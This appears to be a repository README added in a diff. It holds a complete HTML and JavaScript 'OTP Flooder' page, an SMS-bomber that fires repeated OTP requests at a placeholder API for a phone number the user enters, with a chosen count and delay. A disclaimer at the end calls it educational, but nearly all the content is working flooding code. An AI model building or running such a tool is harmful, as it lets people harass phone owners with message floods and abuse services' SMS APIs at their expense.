@@ -1,0 +1,96 @@
+# Sms-bomber-
+
+
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>OTP Flooder (Educational)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>OTP Flooder (Educational)</h1>
+        <input type="text" id="number" placeholder="Enter Number">
+        <input type="number" id="count" placeholder="No. of OTPs" value="10">
+        <input type="number" id="delay" placeholder="Delay in Sec" value="1">
+        <button onclick="startFlood()">Start Flood</button>
+    </div><script>
+    async function sendOTP(number) {
+        // Example Public OTP API URL (Replace with Real API)
+        const apiUrl = 'https://example.com/api/sendotp';
+
+        const payload = {
+            phone: number,
+            country_code: '+91'
+        };
+
+        try {
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            console.log(`Sent OTP to ${number} | Status: ${response.status}`);
+        } catch (error) {
+            console.error('Error Sending OTP:', error);
+        }
+    }
+
+    function startFlood() {
+        const number = document.getElementById('number').value;
+        const count = parseInt(document.getElementById('count').value);
+        const delay = parseInt(document.getElementById('delay').value) * 1000;
+
+        if (!number) {
+            alert('Please enter a number.');
+            return;
+        }
+
+        for (let i = 0; i < count; i++) {
+            setTimeout(() => {
+                sendOTP(number);
+            }, i * delay);
+        }
+
+        alert(`Started flooding ${number} with ${count} OTPs.`);
+    }
+</script>
+
+</body>
+</html><!-- ------------------------------
+DISCLAIMER:
+This is only for Learning Rate-Limiting, API Automation, and Ethical Testing.
+Never use this script for attacking services or harassing individuals.
+------------------------------ -->
